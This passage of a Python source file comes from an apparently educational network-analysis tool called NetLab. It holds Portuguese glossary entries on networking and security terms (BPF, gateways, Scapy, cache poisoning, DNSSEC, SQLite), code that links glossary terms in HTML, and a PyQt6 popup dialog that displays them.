            "de rede em modo promíscuo para receber e analisar todos os pacotes que "
            "circulam no meio físico da rede."
        ),
        "alerta": (
            "Proteja seus dados contra farejadores utilizando criptografia forte em todos "
            "os protocolos (HTTPS, SSH, SFTP, etc.) para tornar o tráfego capturado ilegível."
        ),
        "cor_alerta": _AVISO,
    },

    "BPF": {
        "titulo": "BPF — Berkeley Packet Filter",
        "definicao": (
            "Mecanismo de alta performance no kernel do sistema operacional que filtra "
            "e seleciona pacotes de rede brutos, descartando tráfego irrelevante antes "
            "que ele seja enviado para aplicações de nível de usuário."
        ),
        "finalidade": (
            "Permite capturar apenas o tráfego de interesse (ex: apenas DNS ou apenas HTTP) "
            "diretamente no kernel, economizando CPU e memória preciosos em monitoramentos "
            "de alta velocidade."
        ),
        "exemplo": (
            "O filtro BPF `tcp port 80` instrui o capturador a ignorar todos os pacotes UDP, "
            "ARP ou TCP de outras portas, enviando ao NetLab apenas o tráfego web HTTP padrão."
        ),
    },

    "Header": {
        "titulo": "Header (Cabeçalho de Pacote)",
        "definicao": (
            "Metadados adicionados no início de um pacote ou mensagem que contêm "
            "informações de controle essenciais para o transporte, roteamento, "
            "entrega e formatação dos dados pela rede."
        ),
        "finalidade": (
            "Funciona como o envelope de uma carta física. Enquanto o 'payload' é a "
            "mensagem em si, o header contém o remetente, o destinatário, a versão "
            "do protocolo, checksums e flags de controle."
        ),
        "exemplo": (
            "O cabeçalho IP contém os IPs de origem e destino. O cabeçalho TCP "
            "contém as portas de origem/destino e as flags (SYN, ACK). O cabeçalho "
            "HTTP contém cookies, User-Agent e tipo de conteúdo."
        ),
    },

    "Gateway": {
        "titulo": "Gateway (Portal de Rede)",
        "definicao": (
            "Dispositivo de rede (geralmente um roteador) que serve como ponto de entrada "
            "e saída entre duas redes distintas, traduzindo e direcionando o tráfego interno "
            "para fora."
        ),
        "finalidade": (
            "Permite que computadores de uma rede local (LAN) privada se comuniquem com "
            "computadores de redes externas (como a Internet), enviando todos os pacotes externos "
            "a ele."
        ),
        "exemplo": (
            "Se o IP do seu roteador é 192.168.1.1, todos os computadores da sua casa são "
            "configurados com o Gateway Padrão = 192.168.1.1 para conseguir acessar o Google."
        ),
    },

    "Scapy": {
        "titulo": "Scapy",
        "definicao": (
            "Biblioteca Python para manipulação programática de pacotes de rede. "
            "Permite capturar, criar, enviar, modificar e analisar pacotes de "
            "praticamente qualquer protocolo de rede."
        ),
        "finalidade": (
            "Amplamente usada em segurança para testes de penetração, "
            "fuzzing de protocolos, criação de ferramentas de análise e "
            "aprendizado prático de redes."
        ),
        "exemplo": (
            "from scapy.all import sniff, TCP, IP — com poucas linhas é possível "
            "criar um sniffer personalizado ou enviar pacotes TCP com flags "
            "específicas (SYN flood, RST injection, etc.)."
        ),
    },

    "Wireshark": {
        "titulo": "Wireshark",
        "definicao": (
            "Analisador de protocolos de rede com interface gráfica que captura "
            "e inspeciona pacotes em tempo real, com dissecção automática de "
            "centenas de protocolos diferentes."
        ),
        "finalidade": (
            "Ferramenta padrão da indústria para diagnóstico de rede, análise "
            "forense de tráfego e aprendizado prático de como os protocolos "
            "funcionam na prática."
        ),
        "exemplo": (
            "No Wireshark, o filtro http.request.method == 'POST' mostra "
            "apenas requisições de formulário. O filtro dns mostra todas as "
            "consultas DNS — incluindo domínios acessados."
        ),
    },

    "PyQt6": {
        "titulo": "PyQt6",
        "definicao": (
            "Binding Python para o framework Qt6, que provê bibliotecas para "
            "criação de interfaces gráficas (GUI) multiplataforma, "
            "comunicação de rede, banco de dados e multithreading."
        ),
        "finalidade": (
            "Permite criar aplicações desktop completas em Python com visual "
            "nativo no Windows, Linux e macOS. Usado pelo NetLab para a "
            "interface do Modo Análise."
        ),
        "exemplo": (
            "QWidget, QLabel, QTextBrowser, QDialog são classes do PyQt6 "
            "que compõem os painéis desta ferramenta educacional."
        ),
    },

    "cache poisoning": {
        "titulo": "Cache Poisoning (Envenenamento de Cache)",
        "definicao": (
            "Técnica de ataque cibernético que consiste em corromper o cache local "
            "de um resolvedor DNS ou cache ARP com registros falsificados, fazendo com que "
            "as requisições subsequentes sejam direcionadas a destinos incorretos."
        ),
        "finalidade": (
            "Permite redirecionar o tráfego de usuários legítimos de forma invisível "
            "e em larga escala para servidores controlados pelo atacante."
        ),
        "exemplo": (
            "O envenenamento de cache do servidor DNS de uma escola faz com que todos os "
            "computadores que tentarem acessar 'google.com' caiam em uma página clonada "
            "de phishing sem gerar nenhum alerta visível na URL."
        ),
        "alerta": (
            "Proteja servidores DNS ativando DNSSEC e limpe periodicamente caches de "
            "sistemas expostos."
        ),
        "cor_alerta": _CRITICO,
    },

    "DNSSEC": {
        "titulo": "DNSSEC — Domain Name System Security Extensions",
        "definicao": (
            "Conjunto de extensões de segurança do protocolo DNS que adiciona assinaturas "
            "criptográficas aos registros DNS existentes para validar sua autenticidade."
        ),
        "finalidade": (
            "Garante a integridade e a origem dos dados DNS recebidos, protegendo os usuários "
            "contra ataques de DNS Spoofing e Cache Poisoning."
        ),
        "exemplo": (
            "Com o DNSSEC ativo, o resolvedor DNS valida a assinatura digital do registro de "
            "'banco.com'. Se um atacante tentar injetar um IP falso, a assinatura será inválida "
            "e a resposta falsificada será rejeitada imediatamente."
        ),
    },

    "SQL": {
        "titulo": "SQL — Structured Query Language",
        "definicao": (
            "Linguagem de programação padronizada utilizada para gerenciar, consultar e "
            "manipular dados em bancos de dados relacionais."
        ),
        "finalidade": (
            "Permite criar tabelas, inserir registros de usuários, buscar informações de login "
            "e atualizar dados através de comandos simples (como SELECT, INSERT, UPDATE)."
        ),
        "exemplo": (
            "O comando SELECT * FROM usuarios WHERE nome='admin' busca os dados do administrador "
            "no banco de dados SQLite do Servidor de Laboratório do NetLab."
        ),
    },

    "SQLite": {
        "titulo": "SQLite Database",
        "definicao": (
            "Mecanismo de banco de dados relacional leve, rápido e contido em um único arquivo, "
            "que dispensa a necessidade de um servidor de banco de dados dedicado."
        ),
        "finalidade": (
            "Muito utilizado em aplicações mobile, softwares desktop e ambientes educacionais "
            "para persistência e simulação rápida de dados em memória RAM."
        ),
        "exemplo": (
            "O Servidor de Laboratório do NetLab utiliza o SQLite em memória para simular o "
            "banco de dados de usuários e compras, que é reiniciado limpo a cada nova sessão."
        ),
    },
}

# ══════════════════════════════════════════════════════════════
# MECANISMO DE MARCAÇÃO DE TERMOS NO HTML
# ══════════════════════════════════════════════════════════════

# Termos ordenados do mais longo ao mais curto para evitar substituições
# parciais (ex: "ECDHE" antes de "DHCP" antes de "TCP").
_TERMOS_ORDENADOS = sorted(GLOSSARIO.keys(), key=len, reverse=True)

# Regex principal — case-insensitive, com word boundaries
_REGEX_TERMOS = re.compile(
    r'\b(' + '|'.join(re.escape(t) for t in _TERMOS_ORDENADOS) + r')\b',
    re.IGNORECASE,
)

# Regex para detectar tag de abertura ou fechamento de âncora
_RE_ABRE_ANCORA  = re.compile(r'^<a[\s>]', re.IGNORECASE)
_RE_FECHA_ANCORA = re.compile(r'^</a[\s>]?', re.IGNORECASE)

# Estilo visual dos links de glossário
_ESTILO_LINK = (
    f"color:{_ACCENT2};"
    "text-decoration:underline;"
    "text-decoration-style:dotted;"
)


def _chave_canoninca(termo_capturado: str) -> str:
    """Retorna a chave exata do glossário para o termo capturado (busca case-insensitive)."""
    for chave in GLOSSARIO:
        if chave.lower() == termo_capturado.lower():
            return chave
    return termo_capturado


def _substituir_em_texto(texto: str, ja_marcados: set) -> str:
    """
    Substitui termos do glossário em um fragmento de texto puro (sem tags HTML).
    Cada termo é marcado apenas na primeira ocorrência para não poluir o layout.
    """
    def _substituir(m: re.Match) -> str:
        termo_original = m.group(0)
        chave = _chave_canoninca(termo_original)

        # Pula se este termo já foi marcado neste bloco HTML
        if chave in ja_marcados:
            return termo_original

        ja_marcados.add(chave)
        return (
            f'<a href="glossario://{chave}" style="{_ESTILO_LINK}">'
            f'{termo_original}</a>'
        )

    return _REGEX_TERMOS.sub(_substituir, texto)


def marcar_termos(html: str) -> str:
    """
    Percorre o HTML e envolve termos do glossário em links âncora clicáveis.

    Regras de segurança:
    - Atua apenas em nós de texto — nunca modifica atributos ou tags HTML.
    - Não marca termos que já estejam dentro de um elemento <a> (evita aninhamento).
    - Cada termo é marcado apenas uma vez por bloco HTML (evita poluição visual).

    Retorna o HTML com os links injetados.
    """
    if not html:
        return html

    # Divide o HTML em: [texto, <tag>, texto, <tag>, ...]
    partes = re.split(r'(<[^>]*>)', html)

    resultado     = []
    dentro_ancora = 0         # profundidade de aninhamento dentro de <a>
    ja_marcados: set[str] = set()   # termos já marcados neste bloco

    for parte in partes:
        if parte.startswith('<'):
            # Rastreia abertura/fechamento de tags <a>
            if _RE_ABRE_ANCORA.match(parte):
                dentro_ancora += 1
            elif _RE_FECHA_ANCORA.match(parte):
                dentro_ancora = max(0, dentro_ancora - 1)
            resultado.append(parte)
        else:
            # Nó de texto: substitui apenas fora de <a> e em texto não vazio
            if dentro_ancora == 0 and parte.strip():
                resultado.append(_substituir_em_texto(parte, ja_marcados))
            else:
                resultado.append(parte)

    return ''.join(resultado)


# ══════════════════════════════════════════════════════════════
# JANELA / MODAL DO GLOSSÁRIO
# ══════════════════════════════════════════════════════════════

class JanelaGlossario(QDialog):
    """
    Modal contextual exibido ao clicar em um termo do glossário.
    Aparece próximo ao cursor, sem bloquear a janela principal.
    Fecha ao clicar no botão X ou ao perder o foco (comportamento de popup).
    """

    def __init__(self, termo: str, parent=None):
        super().__init__(parent)
        self._drag_pos = None
        
        # Decodifica percent-encoding (ex: %20 -> espaço) para busca precisa
        import urllib.parse
        termo = urllib.parse.unquote(termo)
        
        # Busca o termo no dicionário de forma case-insensitive
        entrada = {}
        for chave, dados in GLOSSARIO.items():
            if chave.lower() == termo.lower():
                termo = chave  # Restaura o termo canônico (ex: HTTP)
                entrada = dados
                break

        self.setWindowTitle(f"Glossário — {termo}")
        self.setWindowModality(Qt.WindowModality.NonModal)
        self.setFixedWidth(380)
        self.setWindowFlags(
            Qt.WindowType.Tool
            | Qt.WindowType.FramelessWindowHint
            | Qt.WindowType.WindowStaysOnTopHint
        )
        self.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose)

        self._montar_layout(termo, entrada)

    # ─────────────────────────────────────────────────────────
    # CONSTRUÇÃO DO LAYOUT
    # ─────────────────────────────────────────────────────────

    def _montar_layout(self, termo: str, entrada: dict):
        """Constrói o visual do modal com todas as seções de conteúdo."""
        raiz = QVBoxLayout(self)
        raiz.setContentsMargins(0, 0, 0, 0)
        raiz.setSpacing(0)

        # Container com fundo escuro e borda sutil
        container = QFrame()
        container.setObjectName("container")
        container.setStyleSheet(f"""
            QFrame#container {{
                background: {_BG2};
                border: 1px solid {_BORDA2};
                border-radius: 8px;
            }}
        """)

        lay = QVBoxLayout(container)
        lay.setContentsMargins(18, 14, 18, 16)
        lay.setSpacing(10)

        # ── Cabeçalho: título do termo + botão fechar ─────────
        lay.addLayout(self._mk_cabecalho(entrada.get("titulo", termo)))

        # ── Separador ─────────────────────────────────────────
        linha = QFrame()
        linha.setFrameShape(QFrame.Shape.HLine)
        linha.setStyleSheet(f"background: {_BORDA}; border: none; max-height: 1px;")
        lay.addWidget(linha)

        # ── Seções de conteúdo ────────────────────────────────
        definicao = entrada.get("definicao", "")
        if definicao:
            lay.addWidget(self._mk_secao("Definição", definicao))

        finalidade = entrada.get("finalidade", "")
        if finalidade:
            lay.addWidget(self._mk_secao("Finalidade prática", finalidade))

        exemplo = entrada.get("exemplo", "")
        if exemplo:
            lay.addWidget(self._mk_secao_exemplo(exemplo))

        alerta = entrada.get("alerta", "")
        cor_alerta = entrada.get("cor_alerta", _AVISO)
        if alerta:
            lay.addWidget(self._mk_secao_alerta(alerta, cor_alerta))

        raiz.addWidget(container)

    def _mk_cabecalho(self, titulo_completo: str) -> QHBoxLayout:
        """Linha do cabeçalho com título e botão de fechar."""
        cab = QHBoxLayout()
        cab.setSpacing(8)

        lbl_titulo = QLabel(titulo_completo)
        lbl_titulo.setWordWrap(True)
        lbl_titulo.setStyleSheet(f"""
            color: {_ACCENT2};
            font-size: 12px;
            font-weight: bold;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: transparent;
        """)

        btn_fechar = QPushButton("X")
        btn_fechar.setFixedSize(22, 22)
        btn_fechar.setCursor(Qt.CursorShape.PointingHandCursor)
        btn_fechar.setStyleSheet(f"""
            QPushButton {{
                background: transparent;
                color: {_MUTED};
                border: none;
                font-size: 10px;
                border-radius: 11px;
            }}
            QPushButton:hover {{
                color: {_TEXTO2};
                background: rgba(255,255,255,8);
            }}
        """)
        btn_fechar.clicked.connect(self.close)

        cab.addWidget(lbl_titulo, 1)
        cab.addWidget(btn_fechar, 0, Qt.AlignmentFlag.AlignTop)
        return cab

    def _mk_secao(self, rotulo: str, texto: str) -> QFrame:
        """Seção genérica com rótulo em maiúsculo e texto descritivo."""
        frame = QFrame()
        frame.setStyleSheet("QFrame { background: transparent; }")
        lay = QVBoxLayout(frame)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(3)

        lbl_rot = QLabel(rotulo.upper())
        lbl_rot.setStyleSheet(f"""
            color: {_MUTED};
            font-size: 8px;
            font-weight: bold;
            letter-spacing: 1.2px;
            background: transparent;
        """)
        lay.addWidget(lbl_rot)

        lbl_txt = QLabel(texto)
        lbl_txt.setWordWrap(True)
        lbl_txt.setStyleSheet(f"""
            color: {_TEXTO2};
            font-size: 11px;
            font-family: 'Segoe UI', Arial, sans-serif;
            line-height: 1.6;
            background: transparent;
        """)
        lay.addWidget(lbl_txt)
        return frame

    def _mk_secao_exemplo(self, texto: str) -> QFrame:
        """Seção de exemplo com fundo diferenciado e fonte monoespaçada."""
        frame = QFrame()
        frame.setObjectName("ExemploFrame")
        frame.setStyleSheet(f"""
            QFrame#ExemploFrame {{
                background: rgba(0, 0, 0, 0.30);
                border: 1px solid {_BORDA};
                border-radius: 5px;
            }}
        """)
        lay = QVBoxLayout(frame)
        lay.setContentsMargins(12, 8, 12, 8)
        lay.setSpacing(3)

        lbl_rot = QLabel("EXEMPLO")
        lbl_rot.setStyleSheet(f"""
            color: {_DIM};
            font-size: 8px;
            font-weight: bold;
            letter-spacing: 1.2px;
            background: transparent;
        """)
        lay.addWidget(lbl_rot)

        lbl_txt = QLabel(texto)
        lbl_txt.setWordWrap(True)
        lbl_txt.setStyleSheet(f"""
            color: {_TEXTO2};
            font-family: Consolas, monospace;
            font-size: 10px;
            background: transparent;
        """)
        lay.addWidget(lbl_txt)
        return frame

    def _mk_secao_alerta(self, texto: str, cor: str) -> QFrame:
        """Seção de alerta de segurança com borda lateral colorida."""
        frame = QFrame()
        frame.setObjectName("AlertaFrame")
        frame.setStyleSheet(f"""
            QFrame#AlertaFrame {{
                background: transparent;
                border-left: 3px solid {cor};
            }}
        """)
        lay = QVBoxLayout(frame)
        lay.setContentsMargins(10, 4, 0, 4)
        lay.setSpacing(2)

        lbl_rot = QLabel("SEGURANÇA")
        lbl_rot.setStyleSheet(f"""
            color: {cor};
            font-size: 8px;
            font-weight: bold;
            letter-spacing: 1.2px;
            background: transparent;
        """)
        lay.addWidget(lbl_rot)

        lbl_txt = QLabel(texto)
        lbl_txt.setWordWrap(True)
        lbl_txt.setStyleSheet(f"""
            color: {_TEXTO2};
            font-size: 10px;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: transparent;
        """)
        lay.addWidget(lbl_txt)
        return frame

    # ─────────────────────────────────────────────────────────
    # EXIBIÇÃO E POSICIONAMENTO
    # ─────────────────────────────────────────────────────────

    def mostrar_proximo_cursor(self):
        """
        Exibe o modal próximo à posição atual do cursor,
        ajustando automaticamente para não ultrapassar os limites da tela.
        """
        # Mostra primeiro para que width() e height() sejam calculados
        self.show()
        self.raise_()
        self.activateWindow()

        cursor_pos = QCursor.pos()
        tela = QApplication.primaryScreen().availableGeometry()

        # Offset inicial para não sobrepor o cursor
        x = cursor_pos.x() + 16
        y = cursor_pos.y() + 16

        # Reposiciona se o modal sair da tela pela direita ou pela base
        if x + self.width() > tela.right():
            x = cursor_pos.x() - self.width() - 16
        if y + self.height() > tela.bottom():
            y = cursor_pos.y() - self.height() - 16

        self.move(max(tela.left(), x), max(tela.top(), y))

    def keyPressEvent(self, event):
        """Fecha o modal ao pressionar Escape."""
        if event.key() == Qt.Key.Key_Escape:
            self.close()
        else:
            super().keyPressEvent(event)

    def changeEvent(self, event):
        """Fecha o modal ao perder o foco da janela (se tornar inativa)."""
        if event.type() == QEvent.Type.ActivationChange and not self.isActiveWindow():
            self.close()
        super().changeEvent(event)

    def focusOutEvent(self, event):
        """Fecha o modal ao perder o foco do widget."""
        self.close()
        super().focusOutEvent(event)

    def mousePressEvent(self, event):
        """Inicia o arrasto da janela ao clicar com o botão esquerdo."""
        if event.button() == Qt.MouseButton.LeftButton:
            self._drag_pos = event.globalPosition().toPoint() - self.frameGeometry().topLeft()
            event.accept()
        else:
            super().mousePressEvent(event)

    def mouseMoveEvent(self, event):
        """Move a janela com o mouse se estiver sendo arrastada."""
        if self._drag_pos is not None:
            self.move(event.globalPosition().toPoint() - self._drag_pos)
            event.accept()
        else:
            super().mouseMoveEvent(event)

    def mouseReleaseEvent(self, event):
        """Finaliza o arrasto da janela."""
        if event.button() == Qt.MouseButton.LeftButton:
            self._drag_pos = None
            event.accept()
        else:
            super().mouseReleaseEvent(event)
